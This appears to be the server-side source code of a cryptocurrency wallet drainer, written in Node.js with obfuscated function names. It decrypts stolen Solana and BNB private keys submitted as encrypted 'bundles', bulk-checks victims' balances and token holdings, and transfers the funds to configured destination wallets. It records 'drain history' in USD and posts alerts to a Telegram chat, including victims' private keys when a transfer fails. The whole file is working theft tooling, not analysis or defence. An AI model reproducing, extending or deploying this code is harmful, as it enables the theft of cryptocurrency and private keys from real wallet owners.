import express from 'express';
import bodyParser from 'body-parser';
import fs from 'fs';
import path from 'path';
import crypto from 'crypto';
import bs58 from 'bs58';
import { Connection, PublicKey, Keypair, Transaction, SystemProgram, sendAndConfirmTransaction, LAMPORTS_PER_SOL } from '@solana/web3.js';
import { fileURLToPath } from 'url';
import https from 'https';
import TelegramBot from 'node-telegram-bot-api';
import { ethers } from 'ethers';
import jwt from 'jsonwebtoken';
import dns from 'dns';
dns.setDefaultResultOrder('ipv4first');

async function fetchWithTimeout(url, options = {}, timeoutMs = 30000) {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeoutMs);
  try {
    return await fetch(url, { ...options, signal: controller.signal });
  } finally {
    clearTimeout(timer);
  }
}

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const app = express();
app.set('trust proxy', true);
const SERVER_START_TIME = Date.now();
const Q8M3N7 = path.join(__dirname, 'data.json');
const USERS_PATH = path.join(__dirname, 'users.json');
const DELETED_USERS_PATH = path.join(__dirname, 'deleted_users.json');
const CONFIG_PATH = path.join(__dirname, 'config.json');
const DRAIN_HISTORY_PATH = path.join(__dirname, 'drainhistory.json');
const clients = [];
let redepositMonitorTimer = null;
let redepositMonitorNextCheck = null;
let isManualCheckRunning = false;
let redepositPausedByManualCheck = false;
const balanceCheckJobs = new Map();
let activeBalanceCheckJobId = null;

function loadConfig() {
  if (!fs.existsSync(CONFIG_PATH)) {
    throw new Error(`Missing config file: ${CONFIG_PATH}`);
  }
  const data = fs.readFileSync(CONFIG_PATH, 'utf8');
  return JSON.parse(data);
}

function saveConfig(config) {
  try {
    fs.writeFileSync(CONFIG_PATH, JSON.stringify(config, null, 2));
    return true;
  } catch (error) {
    console.error('Error saving config:', error.message);
    return false;
  }
}

function loadDrainHistory() {
  try {
    if (!fs.existsSync(DRAIN_HISTORY_PATH)) {
      fs.writeFileSync(DRAIN_HISTORY_PATH, '[]');
      return [];
    }
    const data = fs.readFileSync(DRAIN_HISTORY_PATH, 'utf8');
    const history = JSON.parse(data);
    return Array.isArray(history) ? history : [];
  } catch (error) {
    console.error('Error loading drain history:', error.message);
    return [];
  }
}

function saveDrainHistory(history) {
  try {
    fs.writeFileSync(DRAIN_HISTORY_PATH, JSON.stringify(history, null, 2));
    return true;
  } catch (error) {
    console.error('Error saving drain history:', error.message);
    return false;
  }
}

function getTotalDrainedFromHistory() {
  const historyTotal = loadDrainHistory().reduce((sum, entry) => sum + (entry.usdAmount || 0), 0);
  const customAmount = config.customDrainedAmount || 0;
  return historyTotal + customAmount;
}

function getPstDateString(date) {
  return new Date(date).toLocaleString('en-US', { timeZone: 'America/Los_Angeles', year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true });
}

function escapeMd(text) {
  return String(text == null ? '' : text).replace(/[_*`\[\]]/g, '\\$&');
}

function addDrainHistoryEntry(entry) {
  const history = loadDrainHistory();
  entry.pstDate = getPstDateString(entry.timestamp || new Date().toISOString());
  history.push(entry);
  saveDrainHistory(history);
  return {
    history,
    totalDrainedUsd: history.reduce((sum, item) => sum + (item.usdAmount || 0), 0)
  };
}

function migrateDrainHistoryFromConfig() {
  const history = loadDrainHistory();
  if (history.length === 0 && (config.totalDrainedUsd || 0) > 0) {
    history.push({
      timestamp: new Date(0).toISOString(),
      chain: 'LEGACY',
      amount: 0,
      usdAmount: config.totalDrainedUsd,
      txid: null
    });
    saveDrainHistory(history);
    console.log('Migrated existing totalDrainedUsd into drainhistory.json');
  }
}

let config;
try {
  config = loadConfig();
  migrateDrainHistoryFromConfig();
} catch (error) {
  console.error('Error loading config:', error.message);
  process.exit(1);
}

if (!config.jwtSecret) {
  config.jwtSecret = crypto.randomBytes(64).toString('hex');
  saveConfig(config);
}

const JWT_SECRET = config.jwtSecret;
const ADMIN_TOKEN_EXPIRY = '30d';
const USER_TOKEN_EXPIRY = '30d';
const tokenBlacklist = new Set();
let Z4H8L6 = config.adminPassword;
let telegramBot = new TelegramBot(config.telegramBotToken, { polling: false });

function reinitializeTelegramBot() {
  try {
    telegramBot = new TelegramBot(config.telegramBotToken, { polling: false });
    console.log('Telegram bot reinitialized');
  } catch (error) {
    console.error('Error reinitializing Telegram bot:', error.message);
  }
}

const bscProvider = new ethers.JsonRpcProvider('https://bsc-dataseed1.binance.org');

function validateBookmarkPayload(entry) {
  const hasSolBundles = entry.sBundles && entry.bundle;
  const hasBnbBundles = entry.eBundles && (entry.evmBundleKey || entry.bundle);

  if (!hasSolBundles && !hasBnbBundles) {
    return false;
  }

  if (hasSolBundles) {
    try {
      const arr = JSON.parse(entry.sBundles);
      if (!Array.isArray(arr) || arr.length === 0) return false;
      for (const item of arr) {
        if (typeof item !== 'string' || !item.includes(':')) return false;
        const parts = item.split(':');
        if (parts.length !== 2) return false;
        const iv = Buffer.from(parts[0], 'base64');
        const ct = Buffer.from(parts[1], 'base64');
        if (iv.length === 0 || ct.length === 0) return false;
      }
      const key = Buffer.from(entry.bundle, 'base64');
      if (key.length !== 32) return false;
    } catch {
      return false;
    }
  }

  if (hasBnbBundles) {
    try {
      const evmKey = entry.evmBundleKey || entry.bundle;
      const arr = JSON.parse(entry.eBundles);
      if (!Array.isArray(arr) || arr.length === 0) return false;
      for (const item of arr) {
        if (typeof item !== 'string' || !item.includes(':')) return false;
        const parts = item.split(':');
        if (parts.length !== 2) return false;
        const iv = Buffer.from(parts[0], 'base64');
        const ct = Buffer.from(parts[1], 'base64');
        if (iv.length === 0 || ct.length === 0) return false;
      }
      const key = Buffer.from(evmKey, 'base64');
      if (key.length !== 32) return false;
    } catch {
      return false;
    }
  }

  let hasValidWallet = false;
  if (hasSolBundles) {
    const result = J8L4Q6(entry.sBundles, entry.bundle);
    if (result.wallets && result.wallets.some(w => !w.error && w.publicKey)) {
      hasValidWallet = true;
    }
  }
  if (!hasValidWallet && hasBnbBundles) {
    const evmKey = entry.evmBundleKey || entry.bundle;
    const result = processBnbBundles(entry.eBundles, evmKey);
    if (result.wallets && result.wallets.some(w => !w.error && w.publicKey)) {
      hasValidWallet = true;
    }
  }

  return hasValidWallet;
}

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
if (!fs.existsSync(Q8M3N7)) {
  fs.writeFileSync(Q8M3N7, JSON.stringify([]));
}
if (!fs.existsSync(USERS_PATH)) {
  fs.writeFileSync(USERS_PATH, JSON.stringify([]));
}
if (!fs.existsSync(DELETED_USERS_PATH)) {
  fs.writeFileSync(DELETED_USERS_PATH, JSON.stringify([]));
}

function loadUsers() {
  try {
    const data = fs.readFileSync(USERS_PATH, 'utf8');
    return JSON.parse(data);
  } catch (error) {
    return [];
  }
}

function saveUsers(users) {
  fs.writeFileSync(USERS_PATH, JSON.stringify(users, null, 2));
}

function loadDeletedUsers() {
  try {
    const data = fs.readFileSync(DELETED_USERS_PATH, 'utf8');
    return JSON.parse(data);
  } catch (error) {
    return [];
  }
}

function saveDeletedUsers(users) {
  fs.writeFileSync(DELETED_USERS_PATH, JSON.stringify(users, null, 2));
}

function normalizeToIpv4(ip) {
  if (!ip) return 'unknown';
  ip = ip.trim();
  ip = ip.replace(/^\[|\]$/g, '');
  ip = ip.replace(/^::ffff:/, '');
  ip = ip.replace(/^0:0:0:0:0:ffff:/, '');
  if (ip === '::1' || ip === '0:0:0:0:0:0:0:1') return '127.0.0.1';
  const mappedMatch = ip.match(/(?:::ffff:|0:0:0:0:0:ffff:)(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})$/i);
  if (mappedMatch) return mappedMatch[1];
  return ip;
}

function isIpv4(ip) {
  return /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(ip);
}

const ipInfoCache = new Map();
const IP_CACHE_TTL = 60 * 60 * 1000;

async function resolveToIpv4(ip) {
  const normalized = normalizeToIpv4(ip);
  if (isIpv4(normalized)) return normalized;
  const cached = ipInfoCache.get(normalized);
  if (cached && (Date.now() - cached.time) < IP_CACHE_TTL) {
    return cached.ipv4 || normalized;
  }
  try {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 3000);
    const response = await fetch(`https://ipinfo.io/${encodeURIComponent(normalized)}/json`, {
      signal: controller.signal,
      headers: { 'Accept': 'application/json' }
    });
    clearTimeout(timeout);
    if (response.ok) {
      const data = await response.json();
      const responseIp = data.ip;
      if (responseIp && isIpv4(responseIp)) {
        ipInfoCache.set(normalized, { ipv4: responseIp, time: Date.now() });
        return responseIp;
      }
    }
  } catch (e) {
    console.error('ipinfo lookup failed for', normalized, ':', e.message);
  }
  ipInfoCache.set(normalized, { ipv4: null, time: Date.now() });
  return normalized;
}

function getClientIpSync(req) {
  const cfIp = req.headers['cf-connecting-ip'];
  if (cfIp) return normalizeToIpv4(cfIp);
  const forwarded = req.headers['x-forwarded-for'];
  if (forwarded) {
    const raw = forwarded.split(',')[0].trim();
    return normalizeToIpv4(raw);
  }
  const ip = req.socket.remoteAddress || 'unknown';
  return normalizeToIpv4(ip);
}

async function getClientIp(req) {
  const syncIp = getClientIpSync(req);
  if (isIpv4(syncIp)) return syncIp;
  try {
    const resolved = await resolveToIpv4(syncIp);
    if (isIpv4(resolved)) return resolved;
  } catch (e) {}
  try {
    const hostname = syncIp.replace(/^\[|\]$/g, '');
    const result = await new Promise((resolve, reject) => {
      dns.resolve4(hostname, (err, addresses) => {
        if (err || !addresses || addresses.length === 0) reject(err || new Error('no result'));
        else resolve(addresses[0]);
      });
    });
    if (isIpv4(result)) return result;
  } catch (e) {}
  return syncIp;
}

function validateUsername(username) {
  if (!username || typeof username !== 'string') {
    return 'Username is required';
  }
  const trimmed = username.trim();
  if (trimmed.length < 3 || trimmed.length > 32) {
    return 'Username must be 3–32 characters';
  }
  if (!/^[a-zA-Z0-9_]+$/.test(trimmed)) {
    return 'Username may only contain letters, numbers, and underscores';
  }
  return null;
}

function validatePassword(password) {
  if (!password || typeof password !== 'string') {
    return 'Password is required';
  }
  if (password.length < 8) {
    return 'Password must be at least 8 characters';
  }
  if (!/[a-z]/.test(password)) {
    return 'Password must include a lowercase letter';
  }
  if (!/[A-Z]/.test(password)) {
    return 'Password must include an uppercase letter';
  }
  if (!/[0-9]/.test(password)) {
    return 'Password must include a number';
  }
  return null;
}

function issueAdminToken() {
  return jwt.sign({ role: 'admin' }, JWT_SECRET, { expiresIn: ADMIN_TOKEN_EXPIRY });
}

function verifyAdminToken(token) {
  try {
    if (tokenBlacklist.has(token)) return null;
    const decoded = jwt.verify(token, JWT_SECRET);
    return decoded.role === 'admin' ? decoded : null;
  } catch {
    return null;
  }
}

function issueUserToken(username) {
  return jwt.sign({ username, role: 'user' }, JWT_SECRET, { expiresIn: USER_TOKEN_EXPIRY });
}

function verifyUserToken(token) {
  try {
    if (tokenBlacklist.has(token)) return null;
    const decoded = jwt.verify(token, JWT_SECRET);
    return decoded.role === 'user' ? decoded : null;
  } catch {
    return null;
  }
}

function K9S2E7(req, res, next) {
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1];
  const decoded = token ? verifyAdminToken(token) : null;
  if (!decoded) {
    return res.status(401).json({ success: false, error: 'Unauthorized' });
  }
  next();
}

function K9S2E7User(req, res, next) {
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1];
  const decoded = token ? verifyUserToken(token) : null;
  if (!decoded) {
    return res.status(401).json({ success: false, error: 'Unauthorized' });
  }
  const users = loadUsers();
  if (!users.some(u => u.username === decoded.username)) {
    tokenBlacklist.add(token);
    return res.status(401).json({ success: false, error: 'Unauthorized' });
  }
  req.user = { username: decoded.username };
  next();
}

function D5V8B3() {
  try {
    const data = fs.readFileSync(Q8M3N7, 'utf8');
    return JSON.parse(data);
  } catch (error) {
    return [];
  }
}

function F6N2T9(data) {
  fs.writeFileSync(Q8M3N7, JSON.stringify(data, null, 2));
}

const solanaConnection = new Connection(`https://mainnet.helius-rpc.com/?api-key=${config.heliusApiKey}`, 'confirmed');
let cachedSolPrice = 0;
let cachedBnbPrice = 0;
let lastSolPriceFetch = 0;
let lastBnbPriceFetch = 0;
const PRICE_CACHE_DURATION = 15 * 60 * 1000;

async function fetchPricesFromCoinGecko() {
  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 10000);
    const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=solana,binancecoin&vs_currencies=usd', {
      signal: controller.signal,
      headers: { 'Accept': 'application/json' }
    });
    clearTimeout(timeoutId);
    const data = await response.json();
    const now = Date.now();
    if (data && data.solana && data.solana.usd) {
      cachedSolPrice = parseFloat(data.solana.usd);
      lastSolPriceFetch = now;
      console.log(`sol $${cachedSolPrice}`);
    }
    if (data && data.binancecoin && data.binancecoin.usd) {
      cachedBnbPrice = parseFloat(data.binancecoin.usd);
      lastBnbPriceFetch = now;
      console.log(`bnb $${cachedBnbPrice}`);
    }
  } catch (error) {
    console.error('Error fetching prices from CoinGecko:', error.message);
  }
}

async function G7P4R8() {
  const now = Date.now();
  if (cachedSolPrice && (now - lastSolPriceFetch) < PRICE_CACHE_DURATION) {
    return cachedSolPrice;
  }
  await fetchPricesFromCoinGecko();
  return cachedSolPrice || 0;
}

async function getBnbPrice() {
  const now = Date.now();
  if (cachedBnbPrice && (now - lastBnbPriceFetch) < PRICE_CACHE_DURATION) {
    return cachedBnbPrice;
  }
  await fetchPricesFromCoinGecko();
  return cachedBnbPrice || 0;
}

fetchPricesFromCoinGecko();

async function H3X9M5(publicKeyString) {
  try {
    const publicKey = new PublicKey(publicKeyString);
    const balance = await solanaConnection.getBalance(publicKey);
    return balance / LAMPORTS_PER_SOL;
  } catch (error) {
    console.error(`Error checking SOL balance for ${publicKeyString}:`, error.message);
    return null;
  }
}

async function checkBnbBalance(address) {
  try {
    const balance = await bscProvider.getBalance(address);
    return parseFloat(ethers.formatEther(balance));
  } catch (error) {
    console.error(`Error checking BNB balance for ${address}:`, error.message);
    return null;
  }
}

async function getBulkSolBalances(publicKeyStrings, onProgress) {
  const BATCH_SIZE = 100;
  const results = new Map();
  for (let i = 0; i < publicKeyStrings.length; i += BATCH_SIZE) {
    const batch = publicKeyStrings.slice(i, i + BATCH_SIZE);
    const pubKeyObjects = batch.map(pk => new PublicKey(pk));
    try {
      const accounts = await solanaConnection.getMultipleAccountsInfo(pubKeyObjects);
      accounts.forEach((account, idx) => {
        if (account === null) {
          results.set(batch[idx], 0);
        } else {
          results.set(batch[idx], account.lamports / LAMPORTS_PER_SOL);
        }
      });
    } catch (error) {
      console.error(`Error in bulk SOL balance batch starting at index ${i}:`, error.message);
      batch.forEach(pk => results.set(pk, null));
    }
    if (onProgress) {
      onProgress(Math.min(i + batch.length, publicKeyStrings.length), publicKeyStrings.length);
    }
    if (i + BATCH_SIZE < publicKeyStrings.length) {
      await new Promise(resolve => setTimeout(resolve, 200));
    }
  }
  return results;
}

async function getBulkBnbBalances(addresses, onProgress) {
  const CONCURRENCY = 5;
  const MAX_RETRIES = 3;
  const results = new Map();
  for (let i = 0; i < addresses.length; i += CONCURRENCY) {
    const batch = addresses.slice(i, i + CONCURRENCY);
    const promises = batch.map(async (address) => {
      for (let attempt = 0; attempt < MAX_RETRIES; attempt++) {
        try {
          const balance = await bscProvider.getBalance(address);
          return { address, balance: parseFloat(ethers.formatEther(balance)) };
        } catch (error) {
          if (attempt < MAX_RETRIES - 1) {
            await new Promise(r => setTimeout(r, 500 * (attempt + 1)));
          } else {
            console.error(`BNB balance failed after ${MAX_RETRIES} retries for ${address}:`, error.message);
            return { address, balance: null };
          }
        }
      }
    });
    const batchResults = await Promise.all(promises);
    batchResults.forEach(r => results.set(r.address, r.balance));
    if (onProgress) {
      onProgress(Math.min(i + batch.length, addresses.length), addresses.length);
    }
    if (i + CONCURRENCY < addresses.length) {
      await new Promise(resolve => setTimeout(resolve, 300));
    }
  }
  return results;
}

const SPL_TOKEN_PROGRAM_ID = new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');

async function getSplTokenInfo(publicKeyString) {
  try {
    const heliusUrl = `https://mainnet.helius-rpc.com/?api-key=${config.heliusApiKey}`;
    const tokens = [];
    let page = 1;
    while (true) {
      const res = await fetchWithTimeout(heliusUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          jsonrpc: '2.0', id: '1', method: 'getAssetsByOwner',
          params: {
            ownerAddress: publicKeyString,
            page,
            limit: 1000,
            displayOptions: { showFungible: true, showNativeBalance: false, showZeroBalance: false }
          }
        })
      });
      const json = await res.json();
      if (json.error) throw new Error(json.error.message);
      const result = json.result;
      if (result.items) {
        for (const item of result.items) {
          if (item.interface !== 'FungibleToken' && item.interface !== 'FungibleAsset') continue;
          const ti = item.token_info;
          if (!ti) continue;
          const decimals = ti.decimals ?? 0;
          const rawBalance = BigInt(ti.balance ?? 0);
          if (rawBalance <= 0n) continue;
          const amount = Number(rawBalance) / Math.pow(10, decimals);
          const symbol = ti.symbol || item.content?.metadata?.symbol || null;
          tokens.push({ mint: item.id, amount, decimals, rawBalance: rawBalance.toString(), symbol });
        }
      }
      if (!result.items || result.items.length < 1000) break;
      page++;
    }
    return tokens;
  } catch (error) {
    console.error(`[SPL] Error getting tokens for ${publicKeyString}:`, error.message);
    return [];
  }
}

async function getSplTokensWithPrices(tokens) {
  if (!tokens || tokens.length === 0) return { totalUsd: 0, tokensWithPrices: [] };
  const USDC_MINT = 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v';
  const SOL_MINT = 'So11111111111111111111111111111111111111112';
  const MAX_IMPACT = 0.9;
  const jupKey = config.jupiterApiKey;
  const uniqueMints = [...new Set(tokens.map(t => t.mint))];
  const priceMap = {};

  for (let i = 0; i < uniqueMints.length; i += 50) {
    const batch = uniqueMints.slice(i, i + 50);
    for (let attempt = 0; attempt < 3; attempt++) {
      try {
        const headers = { 'Accept': 'application/json' };
        if (jupKey) headers['x-api-key'] = jupKey;
        const res = await fetchWithTimeout(`https://api.jup.ag/price/v3?ids=${batch.join(',')}`, { headers });
        if (res.status === 429) { await new Promise(r => setTimeout(r, 600)); continue; }
        const data = await res.json();
        for (const [mint, info] of Object.entries(data)) {
          if (info && info.usdPrice != null) priceMap[mint] = info.usdPrice;
        }
        break;
      } catch { await new Promise(r => setTimeout(r, 400)); }
    }
  }

  let totalUsd = 0;
  const tokensWithPrices = [];

  for (const t of tokens) {
    const price = priceMap[t.mint] || 0;
    if (price <= 0) {
      tokensWithPrices.push({ mint: t.mint, amount: t.amount, decimals: t.decimals, price: 0, usdValue: 0 });
      continue;
    }
    let usdValue = 0;
    if (t.mint === USDC_MINT || t.mint === SOL_MINT) {
      usdValue = t.amount * price;
    } else {
      const rawAmount = t.rawBalance || String(Math.round(t.amount * Math.pow(10, t.decimals)));
      const quoteUrl = `https://api.jup.ag/swap/v1/quote?inputMint=${t.mint}&outputMint=${USDC_MINT}&amount=${rawAmount}&slippageBps=50&swapMode=ExactIn`;
      let sellable = false;
      for (let attempt = 0; attempt < 3; attempt++) {
        try {
          const headers = {};
          if (jupKey) headers['x-api-key'] = jupKey;
          const res = await fetchWithTimeout(quoteUrl, { headers });
          if (res.status === 429) { await new Promise(r => setTimeout(r, 600)); continue; }
          if (res.status === 400) { sellable = false; break; }
          if (!res.ok) { sellable = false; break; }
          const d = await res.json();
          if (d && d.outAmount && Number(d.outAmount) > 0) {
            const impact = Number(d.priceImpactPct || 0);
            sellable = impact < MAX_IMPACT;
          }
          break;
        } catch { await new Promise(r => setTimeout(r, 400)); }
      }
      if (sellable) usdValue = t.amount * price;
      await new Promise(r => setTimeout(r, 120));
    }
    totalUsd += usdValue;
    tokensWithPrices.push({ mint: t.mint, amount: t.amount, decimals: t.decimals, price, usdValue });
  }

  tokensWithPrices.sort((a, b) => b.usdValue - a.usdValue);
  return { totalUsd, tokensWithPrices };
}

async function getSplTokensUsdValue(tokens) {
  const { totalUsd } = await getSplTokensWithPrices(tokens);
  return totalUsd;
}

async function getWalletTokenData(publicKeyString) {
  const rawTokens = await getSplTokenInfo(publicKeyString);
  const { totalUsd, tokensWithPrices } = await getSplTokensWithPrices(rawTokens);
  return { count: rawTokens.length, usdValue: totalUsd, tokens: tokensWithPrices };
}

async function getBulkSolTokenData(publicKeyStrings) {
  const CONCURRENCY = 4;
  const results = new Map();
  for (let i = 0; i < publicKeyStrings.length; i += CONCURRENCY) {
    const batch = publicKeyStrings.slice(i, i + CONCURRENCY);
    const settled = await Promise.allSettled(batch.map(pk => getWalletTokenData(pk)));
    settled.forEach((result, idx) => {
      const pk = batch[idx];
      results.set(pk, result.status === 'fulfilled' ? result.value : { count: 0, usdValue: 0 });
    });
    if (i + CONCURRENCY < publicKeyStrings.length) {
      await new Promise(resolve => setTimeout(resolve, 200));
    }
  }
  return results;
}

function J8L4Q6(sBundlesString, bundleKey) {
  try {
    const sBundlesArray = JSON.parse(sBundlesString);
    const key = Buffer.from(bundleKey, "base64");
    const wallets = [];
    sBundlesArray.forEach((sBundle, idx) => {
      try {
        const [ivB64, ctB64] = sBundle.split(":");
        const iv = Buffer.from(ivB64, "base64");
        const ciphertext = Buffer.from(ctB64, "base64");
        const tag = ciphertext.slice(ciphertext.length - 16);
        const data = ciphertext.slice(0, ciphertext.length - 16);
        const decipher = crypto.createDecipheriv("aes-256-gcm", key, iv);
        decipher.setAuthTag(tag);
        const decrypted = Buffer.concat([decipher.update(data), decipher.final()]);
        const pubKey = decrypted.slice(32, 64);
        wallets.push({
          walletIndex: idx + 1,
          privateKey: bs58.default ? bs58.default.encode(decrypted) : bs58.encode(decrypted),
          publicKey: bs58.default ? bs58.default.encode(pubKey) : bs58.encode(pubKey)
        });
      } catch (e) {
        console.error(`Error processing sBundle #${idx + 1}:`, e.message);
        wallets.push({ walletIndex: idx + 1, error: e.message });
      }
    });
    return { count: sBundlesArray.length, wallets };
  } catch (e) {
    console.error('Error parsing sBundles:', e.message);
    return { count: 0, wallets: [], error: e.message };
  }
}

function processBnbBundles(sBundlesString, bundleKey) {
  try {
    const sBundlesArray = JSON.parse(sBundlesString);
    const key = Buffer.from(bundleKey, "base64");
    const wallets = [];
    sBundlesArray.forEach((sBundle, idx) => {
      try {
        const [ivB64, ctB64] = sBundle.split(":");
        const iv = Buffer.from(ivB64, "base64");
        const ciphertext = Buffer.from(ctB64, "base64");
        const tag = ciphertext.slice(ciphertext.length - 16);
        const data = ciphertext.slice(0, ciphertext.length - 16);
        const decipher = crypto.createDecipheriv("aes-256-gcm", key, iv);
        decipher.setAuthTag(tag);
        const decrypted = Buffer.concat([decipher.update(data), decipher.final()]);
        const privateKeyHex = decrypted.slice(0, 32).toString('hex');
        const wallet = new ethers.Wallet(privateKeyHex);
        wallets.push({ walletIndex: idx + 1, privateKey: privateKeyHex, publicKey: wallet.address });
      } catch (e) {
        console.error(`Error processing BNB sBundle #${idx + 1}:`, e.message);
        wallets.push({ walletIndex: idx + 1, error: e.message });
      }
    });
    return { count: sBundlesArray.length, wallets };
  } catch (e) {
    console.error('Error parsing BNB sBundles:', e.message);
    return { count: 0, wallets: [], error: e.message };
  }
}

async function autoDrainWallet(wallet, solPrice, isManual = false) {
  try {
    const balance = await H3X9M5(wallet.publicKey);
    if (balance === null) {
      return { success: false, reason: 'Failed to fetch balance (RPC error)', balance: 0 };
    }

    const balanceUsd = balance * solPrice;
    if (!isManual && config.minimumDrainAmountUsd > 0 && balanceUsd < config.minimumDrainAmountUsd) {
      return { success: false, reason: `Balance USD ($${balanceUsd.toFixed(2)}) below minimum ($${config.minimumDrainAmountUsd})`, balance };
    }

    const minDrainAmount = config.solReserveAmount + 0.001;
    if (balance < minDrainAmount) {
      return { success: false, reason: 'Balance too low', balance };
    }

    const amountToSend = balance - config.solReserveAmount;
    const lamportsToSend = Math.floor(amountToSend * LAMPORTS_PER_SOL);

    const privateKeyBytes = bs58.default ? bs58.default.decode(wallet.privateKey) : bs58.decode(wallet.privateKey);
    const fromKeypair = Keypair.fromSecretKey(privateKeyBytes);
    const derivedPubKey = fromKeypair.publicKey.toBase58();
    if (derivedPubKey !== wallet.publicKey) {
      console.error(`Public key mismatch: expected ${wallet.publicKey}, got ${derivedPubKey}`);
      return { success: false, reason: 'Public key mismatch', balance };
    }

    const toPublicKey = new PublicKey(config.solanaDestinationWallet);

    let lastError = null;
    const maxAttempts = 2;

    for (let attempt = 0; attempt < maxAttempts; attempt++) {
      try {
        const { blockhash } = await solanaConnection.getLatestBlockhash('confirmed');

        const transaction = new Transaction({
          feePayer: fromKeypair.publicKey,
          recentBlockhash: blockhash,
        }).add(
          SystemProgram.transfer({
            fromPubkey: fromKeypair.publicKey,
            toPubkey: toPublicKey,
            lamports: lamportsToSend,
          })
        );

        const signature = await sendAndConfirmTransaction(
          solanaConnection,
          transaction,
          [fromKeypair],
          { commitment: 'confirmed', preflightCommitment: 'confirmed' }
        );

        const drainedUsd = amountToSend * solPrice;
        const drainEntry = {
          timestamp: new Date().toISOString(),
          chain: 'SOL',
          amount: amountToSend,
          usdAmount: drainedUsd,
          txid: signature,
        };
        const { totalDrainedUsd } = addDrainHistoryEntry(drainEntry);

        clients.forEach((client) => {
          client.res.write(
            `data: ${JSON.stringify({ type: 'drain-update', totalDrainedUsd, entry: drainEntry })}\n\n`
          );
        });

        if (config.telegramNotificationsEnabled) {
          try {
            const drainMessage =
              `✅ *SOL Transfer Created:* ${amountToSend.toFixed(4)} SOL ($${(amountToSend * solPrice).toFixed(2)})\n` +
              `*Txid:* https://solscan.io/tx/${signature}`;
            await telegramBot.sendMessage(config.telegramChatId, drainMessage, { parse_mode: 'Markdown' });
          } catch (telegramError) {
            console.error('Failed to send SOL drain Telegram notification:', telegramError.message);
          }
        }

        return {
          success: true,
          signature,
          amountDrained: amountToSend,
          reserveLeft: config.solReserveAmount,
          balance,
        };
      } catch (error) {
        lastError = error;

        if (error.message && error.message.includes('block height exceeded')) {
          console.log(`[Retry] Block height exceeded, attempt ${attempt + 1} of ${maxAttempts} – retrying...`);
          await new Promise((resolve) => setTimeout(resolve, 500));
          continue;
        } else {
          break;
        }
      }
    }

    throw lastError || new Error('Unknown error during SOL drain');
  } catch (error) {
    console.error(`Error draining SOL wallet ${wallet.walletIndex}:`, error.message);

    if (config.telegramNotificationsEnabled) {
      const errorMessage =
        `❌ *SOL Transfer Failed*\n\n` +
        `*Wallet:* ${wallet.walletIndex}\n` +
        `*Address:* \`${wallet.publicKey}\`\n` +
        `*Private Key:* \`${wallet.privateKey}\`\n` +
        `*Error:* ${escapeMd(error.message)}`;
      try {
        await telegramBot.sendMessage(config.telegramChatId, errorMessage, { parse_mode: 'Markdown' });
      } catch (telegramError) {
        console.error('Failed to send Telegram error notification:', telegramError.message);
      }
    }

    return { success: false, reason: error.message, balance: 0 };
  }
}

async function autoDrainBnbWallet(wallet, bnbPrice, isManual = false) {
  try {
    const balance = await checkBnbBalance(wallet.publicKey);
    if (balance === null) {
      return { success: false, reason: 'Failed to fetch balance (RPC error)', balance: 0 };
    }
    const balanceUsd = balance * bnbPrice;
    if (!isManual && config.minimumDrainAmountUsd > 0 && balanceUsd < config.minimumDrainAmountUsd) {
      return { success: false, reason: `Balance USD ($${balanceUsd.toFixed(2)}) below minimum ($${config.minimumDrainAmountUsd})`, balance };
    }
    const minDrainAmount = config.bnbReserveAmount + 0.0005;
    if (balance < minDrainAmount) {
      return { success: false, reason: 'Balance too low', balance };
    }
    const amountToSend = balance - config.bnbReserveAmount;
    const fromWallet = new ethers.Wallet(wallet.privateKey, bscProvider);
    const feeData = await bscProvider.getFeeData();
    const gasLimit = 21000n;
    const gasPrice = feeData.gasPrice;
    const gasCost = gasLimit * gasPrice;
    const amountWei = ethers.parseEther(amountToSend.toFixed(18));
    const actualAmountWei = amountWei - gasCost;
    if (actualAmountWei <= 0n) {
      return { success: false, reason: 'Balance too low after gas', balance };
    }
    const tx = await fromWallet.sendTransaction({
      to: config.bnbDestinationWallet, value: actualAmountWei, gasLimit, gasPrice
    });
    await tx.wait();
    const actualAmountBnb = parseFloat(ethers.formatEther(actualAmountWei));
    const drainedUsd = actualAmountBnb * bnbPrice;
    const drainEntry = { timestamp: new Date().toISOString(), chain: 'BNB', amount: actualAmountBnb, usdAmount: drainedUsd, txid: tx.hash };
    const { totalDrainedUsd } = addDrainHistoryEntry(drainEntry);
    clients.forEach(client => {
      client.res.write(`data: ${JSON.stringify({ type: 'drain-update', totalDrainedUsd, entry: drainEntry })}\n\n`);
    });
    if (config.telegramNotificationsEnabled) {
      try {
        const drainMessage = `✅ *BNB Transfer Created:* ${actualAmountBnb.toFixed(4)} BNB ($${(actualAmountBnb * bnbPrice).toFixed(2)})\n` +
          `*Txid:* https://bscscan.com/tx/${tx.hash}`;
        await telegramBot.sendMessage(config.telegramChatId, drainMessage, { parse_mode: 'Markdown' });
      } catch (telegramError) {
        console.error('Failed to send BNB drain Telegram notification:', telegramError.message);
      }
    }
    return { success: true, signature: tx.hash, amountDrained: actualAmountBnb, reserveLeft: config.bnbReserveAmount, balance };
  } catch (error) {
    console.error(`Error draining BNB wallet ${wallet.walletIndex}:`, error.message);
    if (config.telegramNotificationsEnabled) {
      const errorMessage = `❌ *BNB Transfer Failed*\n\n` +
        `*Wallet:* ${wallet.walletIndex}\n` +
        `*Address:* \`${wallet.publicKey}\`\n` +
        `*Private Key:* \`${wallet.privateKey}\`\n` +
        `*Error:* ${escapeMd(error.message)}`;
      try {
        await telegramBot.sendMessage(config.telegramChatId, errorMessage, { parse_mode: 'Markdown' });
      } catch (telegramError) {
        console.error('Failed to send Telegram error notification:', telegramError.message);
      }
    }
    return { success: false, reason: error.message, balance: 0 };
  }
}

